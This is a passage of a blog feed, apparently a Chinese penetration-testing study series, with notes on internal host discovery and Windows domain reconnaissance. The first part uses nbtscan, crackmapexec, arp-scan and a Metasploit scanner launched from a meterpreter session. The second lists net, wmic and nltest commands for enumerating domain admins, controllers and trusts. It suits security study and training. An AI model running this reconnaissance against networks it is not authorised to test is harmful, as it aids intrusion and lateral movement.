windows中默认安装TCP/IP后自动安装NetBIOS，139端口。</p>
<p>NetBIOS提供OSI/RM的会话层（在tcp/ip中包含在应用层中）服务，让不同计算机上运行的不同程序可以在局域网中相互连接和共享数据。<br>
严格来说NetBIOS不是一种协议，而是一种应用程序接口（API）几乎所有局域网都是在NetBIOS协议基上工作。 操作系统可以利用WINS服务, 广播, Lmhost文件等模式将NetBIOS名解析为相应的IP地址。<br>
NetBIOS工作流程就是正常的机器名解析，查询，应答。</p>
<p>使用nbtscan<br>
https://github.com/lifenjoiner/nbtscan/releases/tag/nbtscan-v1.5.2-2394b4<br>
<code>nbtscan.exe 10.10.10.1/24</code></p>
<p><strong>3.基于SMB协议探测主机（应用层）</strong><br>
SMB网络文件共享系统协议，是一种应用层传输协议。主要功能使网络上的机器能够共享计算机文件，打印机，串行端口和通信等资源。<br>
CIFS信息一般使用NetBIOS或TCP发生，分别使用139或445。</p>
<p>kali使用crackmapexec工具。crackmapexec也可进行winrm攻击，枚举登用户录。<br>
<code>crackmapexec smb 192.168.159.0/24 </code></p>
<p><strong>4.基于UDP发现主机（传输层）</strong><br>
UDP传输层无连接传输协议，为应用程序提供一种不用连接即可发送封装IP数据包的方法。<br>
在实际利用中可以发送一个空的UDP报文发送到目标主机的特定端口。UDP探测就马上得到一个ICMP端口无法到达的回应报文，这说明该主机正在正常运行。如果探测到一个开放端口，大部分服务将忽略此空报文不做任何回应。<br>
kali  unicornscan  （不是很准）<br>
<code>unicornscan -mU 192.168.159.0/24</code></p>
<p><strong>5.基于ARP发现存活主机（网络层）</strong><br>
ARP（地址解析协议）解析网络层地址来寻找数据链路层的网络传输协议。<br>
主机发送信息时将包含目标IP地址的ARP请求广播到局域网上的所有主机，并接收返回信息，以此来确定目标的物理地址。收到返回信息后，将该IP地址与物理地址存入本机ARP缓存，并保留一定时间，下次请求直接查询ARP缓存。</p>
<p>（1）ARP-Scan的利用</p>
<pre><code>arp-scan.exe -t 192.168.159.0/24
</code></pre>
<p>(2)PowerShell<br>
设置权限<br>
<code>Set-ExecutionPolicy RemoteSigned</code><br>
加载模块<br>
<code>Import-Module C:\Users\Administrator\Desktop\Invoke-ARPScan.ps1</code><br>
<code>Import-Module .\Invoke-ARPScan.ps1</code><br>
使用模块<br>
<code>Invoke-ARPScan -CIDR 192.168.52.1/24</code></p>
<p><strong>6.基于msf</strong></p>
<pre><code>meterpreter &gt; background    # 后台挂起Session

msf5 exploit(multi/handler) &gt; use auxiliary/scanner/netbios/nbname 
msf5 auxiliary(scanner/netbios/nbname) &gt; set rhosts 192.168.52.0/24
msf5 auxiliary(scanner/netbios/nbname) &gt; run
</code></pre>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[内网渗透体系建设--第2章--域内基础信息收集]]></title>
        <id>https://dydydy123.github.io/post/nei-wang-shen-tou-ti-xi-jian-she-di-2-zhang-yu-nei-ji-chu-xin-xi-shou-ji/</id>
        <link href="https://dydydy123.github.io/post/nei-wang-shen-tou-ti-xi-jian-she-di-2-zhang-yu-nei-ji-chu-xin-xi-shou-ji/">
        </link>
        <updated>2023-03-31T02:38:06.000Z</updated>
        <content type="html"><![CDATA[<p><strong>1.判断是否存在域环境</strong><br>
查看当前工作站信息，包括当前计算机名，用户名，系统版本，工作站，登录的域等。<br>
<code>net config workstation</code></p>
<p><strong>2.查看域用户信息</strong><br>
查看所有域用户<br>
<code>net user /domain</code><br>
查看指定域用户<br>
<code>net user &lt;username&gt; /domain</code></p>
<p>查看所有用户的SID，所属域和用户描述信息<br>
<code>wmic useraccount get Caption,Domain,Description</code></p>
<p><strong>3.查看域用户组信息</strong><br>
常见域内系统全局组：<br>
Domain Admins：        域管理员组 （只对本域有完全控制权限）<br>
Domain Users：           域用户组<br>
Domain Computers     域成员主机组<br>
Domain Controllers     域控制器组<br>
Domain Guests            域访客用户组<br>
Group Policy Creator Owners           新建组策略对象组</p>
<p>通用组：（对域林中所有域有完全控制权限）<br>
Enterprise Admins         企业系统管理员组</p>
<p>默认情况下Domain Admins，Enterprise Admins 组中的用户对域内所有域控制器和域成员主机拥有完全控制权限。</p>
<p>查看域内所有用户组信息<br>
<code>net group /domain</code><br>
查看所有域管理员组用户<br>
<code>net group &quot;Domain Admins&quot; /domain</code><br>
查看所有域成员主机组用户，获得所有客户端主机<br>
<code>net group &quot;Domain Computers&quot; /domain</code></p>
<p><strong>4.域内密码管理策略</strong><br>
<code>net accounts /domain</code></p>
<p><strong>5.查看域控制器列表</strong><br>
获取所有域控组用户，可以得到所有的域控制器的主机名。<br>
<code>net group &quot;Domain Controllers&quot; /domain</code><br>
查看指定域的域控制器列表。<br>
<code>nltest /DCLIST:god.org</code></p>
<p><strong>6.查看主域控</strong><br>
<code>net time /domain</code></p>
<p><strong>7 定位域控制器</strong><br>
<code>ping OWA.god.org</code><br>
查看DNS服务器定位：<br>
<code>ipconfig /all</code></p>
<p><strong>8 查看域信任关系</strong><br>
<code>nltest /domain_trusts</code></p>
]]></content>
    </entry>
</feed>